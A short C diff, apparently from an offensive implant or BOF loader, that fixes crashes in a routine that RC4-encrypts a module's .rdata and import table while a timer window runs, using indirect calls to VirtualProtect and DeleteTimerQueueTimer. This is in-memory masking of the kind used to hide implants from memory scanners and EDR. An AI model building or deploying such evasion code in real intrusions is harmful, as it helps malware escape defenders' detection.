@@ -257,6 +257,15 @@ static void bw_blocks_restore(BW_BLOCK * blocks, int n, int text_idx,
 	{
 		fn();
 	}
+
+	/* same class of guard: a local pDelTimer = DeleteTimerQueueTimer gets
+	 * const-folded by /O1 into call [__imp_DeleteTimerQueueTimer] - fatal
+	 * on the mask-fail path where .rdata is already ciphertext */
+	static void bw_call_deltimer(BOOL (WINAPI *fn)(void *, void *, void *),
+	                             void * a, void * b, void * c)
+	{
+		fn(a, b, c);
+	}
 #if defined(_MSC_VER)
 #pragma optimize("", on)
 #endif
@@ -825,9 +834,23 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 		DWORD oldp = 0;
 		if (i == text_idx)
 			continue;
-		if (!pVP(blocks[i].ptr, blocks[i].len, PAGE_READWRITE, &oldp)) {
+		/* ctx->pVirtualProtect, NOT the pVP local: /O1 const-folds the
+		 * local (pVP = VirtualProtect) back into call [__imp_VirtualProtect]
+		 * - once an earlier block masked .rdata that indirect call reads
+		 * ciphertext and jumps to garbage (crash 7, spwizimg+0x15c79).
+		 * The ctx-page load is opaque to the optimizer. */
+		if (!ctx->pVirtualProtect(blocks[i].ptr, blocks[i].len, PAGE_READWRITE, &oldp)) {
+			int j;
+			/* blocks 0..i-1 are ciphertext and .rdata may be among them:
+			 * decrypt BEFORE touching the protections - bw_blocks_restore's
+			 * indirect call runs through the .text import thunk, which
+			 * dereferences the (still masked) IAT otherwise */
+			for (j = 0; j < i; j++) {
+				if (j != text_idx)
+					bw_rc4(fn, blocks[j].ptr, blocks[j].len, ctx->key2, key, (unsigned int)j);
+			}
 			bw_blocks_restore(blocks, nblocks, text_idx, pVP);
-			pDelTimer(NULL, timer, NULL);
+			bw_call_deltimer(pDelTimer, NULL, timer, NULL);
 			ctx->state = BW_STATE_IDLE;
 			return FALSE;
 		}
@@ -860,7 +883,7 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	}
 	bw_blocks_restore(blocks, nblocks, text_idx, pVP);
 	ctx->phase = 6;
-	pDelTimer(NULL, timer, NULL);
+	bw_call_deltimer(pDelTimer, NULL, timer, NULL);
 	ctx->phase = 7;
 	BW_TRACE("window complete"); /* IAT alive again: everything unmasked */
 
